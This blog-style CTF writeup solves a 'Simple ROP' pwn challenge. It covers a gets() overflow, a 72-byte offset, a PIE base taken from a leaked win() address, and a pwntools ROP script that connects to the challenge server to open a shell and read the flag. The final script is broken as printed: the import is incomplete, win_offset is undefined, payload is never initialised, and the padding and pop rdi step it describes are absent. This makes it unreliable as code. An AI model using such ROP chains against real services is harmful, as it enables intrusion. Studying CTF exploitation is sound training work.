+++
title = "Simple ROP Writeup"
date = 2026-02-15T06:00:00Z
draft = false
tags = ["pwn", "rop", "binary exploitation", "ctf"]
categories = ["CTF Writeups"]
+++

# Simple ROP Alpacahack — Writeup

**Category:** Pwn  
**Difficulty:** Hard  
**Goal:** Call

`win(0xdeadbeefcafebabe, 0x1122334455667788, 0xabcdabcdabcdabcd)` 

to spawn a shell and read `/flag.txt`.

----------

# Understanding the Binary

The vulnerable code:

`char buffer[64];
gets(buffer);` 

`gets()` allows unlimited input → **buffer overflow vulnerability**.

The `win()` function checks 3 arguments:

`param1 == 0xdeadbeefcafebabe param2 == 0x1122334455667788 param3 == 0xabcdabcdabcdabcd` 

If all pass → `/bin/sh` is executed.

----------

#  Security Protections

From `checksec`:

`Arch:  amd64  RELRO:  Full  RELRO  Stack:  No  canary  NX:  Enabled  PIE:  Enabled  SHSTK:  Enabled  IBT:  Enabled` 

### What matters:

-   No canary → we can overflow safely
    
-    NX enabled → cannot inject shellcode
    
-   PIE enabled → addresses change every run
    

So we must use **ROP**.

----------

#  Why This Is a ROP Challenge

The binary conveniently includes gadgets:

   

     pop rdi ; ret
        pop rsi ; ret
        pop rdx ; ret` 

On **x86_64 Linux**, function arguments go into registers:

Argument                                     Register 
1st                                                     -rdi
2nd                                                   -rsi
3rd                                                    -rdx

So to call:

    `win(A, B, C)` 

We must control:

    `rdi = A rsi = B rdx = C` 

----------

#  Finding the Offset

Stack layout:

     `[ buffer (64 bytes) ]  
      [ saved rbp (8)      ] 
      [ return address     ]` 

So:

    `64 + 8 = 72  bytes` 

Offset to RIP = **72 bytes**

----------

#  Dealing With PIE

Since PIE is enabled, addresses change every run.

But the program prints:

   ```c
    printf("address of win function: %p\n", win);
```
This leaks the runtime address of `win`.

So we can calculate the PIE base:

    `pie_base = win_runtime - win_offset`

 

Then compute gadget addresses using that base.

----------

#  Final Exploit Script
```python
    from pwn import 
    
    elf = ELF("./chal")
    rop = ROP(elf)
    
    p = remote("34.170.146.252", 31441) # p = process("./chal")  
    win_runtime = int(p.recvline().strip(), 16)
    
    log.info(f"win runtime: {hex(win_runtime)}") 
    pie_base = win_runtime - win_offset
    
    log.info(f"PIE base: {hex(pie_base)}") 
    pop_rsi_offset = rop.find_gadget(['pop rsi', 'ret'])[0]
    pop_rdx_offset = rop.find_gadget(['pop rdx', 'ret'])[0] 
    pop_rsi = pie_base + pop_rsi_offset
    pop_rdx = pie_base + pop_rdx_offset 
    payload += p64(0xdeadbeefcafebabe)
    payload += p64(pop_rsi)
    payload += p64(0x1122334455667788)
    payload += p64(pop_rdx)
    payload += p64(0xabcdabcdabcdabcd)
    payload += p64(win_runtime)
    
    p.sendlineafter("input > ", payload)
    p.interactive()` 
```
----------

# Getting the Flag

Once the shell spawns:

`cat /flag.txt`


